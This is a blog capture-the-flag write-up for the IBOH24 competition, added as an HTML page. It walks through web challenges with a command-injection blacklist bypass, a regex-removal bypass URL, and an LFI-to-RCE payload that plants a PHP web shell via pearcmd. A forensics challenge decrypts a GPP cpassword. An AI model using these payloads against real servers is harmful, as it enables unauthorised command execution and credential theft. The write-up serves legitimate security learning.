@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Megat Zafran">
+
+
+    <meta name="subtitle" content="that one socially inept kid">
+
+
+    <meta name="description" content="whoami">
+
+
+    <meta name="keywords" content="aan0303, megat, ilikeronnnnii">
+
+
+<title>IBOH24CTF | aan0303</title>
+
+
+
+    <link rel="icon" href="/favicon.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">aan&#39;s stash</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">aan&#39;s stash</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">IBOH24CTF</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Megat Zafran</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 15, 2024&nbsp;&nbsp;19:06:59</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <blockquote>
+<p>This is my first time joining IBOH and I’ve heard a lot of good feedbacks among ctf’ers before this. Most of the challenges were surprisingly created by students at APU, and despite that, they are of really high quality. I really enjoyed them, especially the forensics challenge, even though there are a couple I didn’t manage to solve during the competition.</p>
+</blockquote>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="In-the-echoes-of-the-system"><a href="#In-the-echoes-of-the-system" class="headerlink" title="In the echoes of the system"></a>In the echoes of the system</h2><p>First there will be a web page that accept an input, and it will be passed into a parameter <code>feedback</code> once sent.</p>
+<p>After trying out <code>ls</code> as one of the input. It is somehow accepted as a unix argument to list all of the directories and files in the current web server directory.</p>
+<p><img src="/images/boh1.png" alt="alt text"></p>
+<p>Noticed that there is <code>flag.txt</code> in the output, therefore, all you need to do is read it by using cat command :).</p>
+<p><img src="/images/boh2.png" alt="alt text"></p>
+<p>But there is a problem though <code>cat</code>, <code>flag</code>, <code>rm</code>, and <code>grep</code> is a blacklisted command so you need to bypass it.</p>
+<p>Here is a well known payload to bypass it <code>c&quot;at&quot;+*</code>, I used asterisk because it will eventually read all the files in the directory so no <code>flag</code> syntax will be included and blocked :)</p>
+<p><img src="/images/boh3.png" alt="alt text"></p>
+<h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><p>For warmup, understanding this block of code will eventually get you the flag.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;warmup&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$string1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;warmup&#x27;</span>];</span><br><span class="line">    <span class="variable">$string2</span> = <span class="string">&#x27;warmupisessential&#x27;</span>;</span><br><span class="line">    <span class="variable">$string3</span> = <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">            <span class="string">&quot;/<span class="subst">$string2</span>/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$string1</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$string3</span> === <span class="variable">$string2</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">warmup_fucntion</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>What happen is, first you need to include the <code>source</code> GET parameter and eventually there will be php source code printed into the web page.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">   <span class="keyword">die</span>();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>That’s the first step now, it wants you to include <code>warmup</code> GET parameter and ensure that the value of the <code>warmup</code> parameter is <code>warmupisessential</code>.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$string1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;warmup&#x27;</span>];</span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&#x27;warmupisessential&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string3</span> = <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">            <span class="string">&quot;/<span class="subst">$string2</span>/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$string1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$string3</span> === <span class="variable">$string2</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">warmup_fucntion</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>But here is the catch though, </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$string3</span> = <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">            <span class="string">&quot;/<span class="subst">$string2</span>/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$string1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>This block of code removes the string <code>warmupisessential</code> from the <code>warmup</code> parameter. To exploit this, you can do the following:</p>
+<p>Construct the payload like this:</p>
+<p><code>w</code> + <del>warmupisessential</del> + <code>armupisessential</code></p>
+<p>The code will remove the <code>warmupisessential</code> in the middle, but when combined, it will still result in the correct payload:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://98.82.201.85:7004/warmup.php?warmup=wwarmupisessentialarmupisessential</span><br></pre></td></tr></table></figure>
+
+<p>flag <code>IBOH24&#123;5e83215e5db52738f7699a3c5d94702c&#125;</code></p>
+<h2 id="Kelvin-Diner"><a href="#Kelvin-Diner" class="headerlink" title="Kelvin Diner"></a>Kelvin Diner</h2><p>At first glance, I thought this web page is vulnerable to IDOR attack. Using <code>id</code> parameter.</p>
+<p><img src="/images/boh5.png" alt="alt text"></p>
+<p>But then on <code>id</code> value 2 on administrator profile, if I’m not mistaken it says something like <code>iboh is not idor</code> or something idk I totally forgot.</p>
+<p>So that means we are not in the right path, so lets try other exploitation techniques.</p>
+<p><img src="/images/boh6.png" alt="alt text"></p>
+<p>As expected, there is another endpoint which is <code>food.php</code> that has a <code>menu_item</code> parameter that is vulnerable to local file inclusion attack.</p>
+<p>I’ve tried php wrapper, but it doesn’t work.</p>
+<p>So reading payload all the things <a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-php-pearcmd">github repo</a>, turns out you can get a remote command execution via <code>pearcmd</code>, which is a framework for php.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">menu/food.php?menu_item=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/exec.php+-d+man_dir=<span class="meta">&lt;?</span><span class="keyword">echo</span>(<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]));<span class="meta">?&gt;</span>+-s+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">menu/food.php?menu_item=/tmp/exec.php&amp;c=ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/boh7.png" alt="alt text"></p>
+<p>Now all you need to do is just find the flag</p>
+<p><img src="/images/boh8.png" alt="alt text"></p>
+<h1 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h1><h2 id="New-Hire"><a href="#New-Hire" class="headerlink" title="New Hire"></a>New Hire</h2><p>For this challenge we are presented with a kali folder and a couple of xml files, no clue what this is during the competition, but then after reading @warlocksmurf’s writeups it turns out to be an output from AD Enumeration tool.</p>
+<p>Here is the structure</p>
+<p><img src="/images/boh10.png" alt="alt text"></p>
+<p>So what I did was first taking a look at <code>groups.xml</code> file</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;Groups ... cpassword=&quot;FKhE/Beywcp8ZLLxH6LszmcuRiXceWaeEXvSJ5jKyJjqJ9vAidZiHVebDcE6n+Wi&quot; ... &lt;/Groups&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>This part right here caught my attention so I decided to google it, then I come across an article <a target="_blank" rel="noopener" href="https://n1chr0x.medium.com/unwrapping-gpp-exposing-the-cpassword-attack-vector-using-active-htb-machine-4d3b97e0ac43">Unwrapping GPP: Exposing the cPassword Attack Vector using Active (HTB Machine)</a>.</p>
+<p>Turns out that cPassword is a credentials that admin uses to create policies for GPP and somehow the key to decrypt <code>cPassword</code> was released accidently.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/t0thkr1s/gpp-decrypt">Here</a> is a tool written to decrypt it.</p>
+<p>Second part of the flag retrieved!</p>
+<p><img src="/images/boh11.png" alt="alt text"></p>
+<p>Now the first part of the flag, you need to further analyze the <code>recon</code> folder that has <code>20240815030319_users.json</code> information in it. Upon further investigation there is a base64 strings attached in it.</p>
+<p><img src="/images/boh12.png" alt="alt text"></p>
+<p>There you go!, combine both of the flags together</p>
+<p><img src="/images/boh13.png" alt="alt text"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Megat Zafran</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://ilikeronnnnii.github.io/2024/10/16/iboh24/">https://ilikeronnnnii.github.io/2024/10/16/iboh24/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>peepo pog</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Writeups/"># Writeups</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/09/08/lekir/">Lekir - Command Injection</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Megat Zafran | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
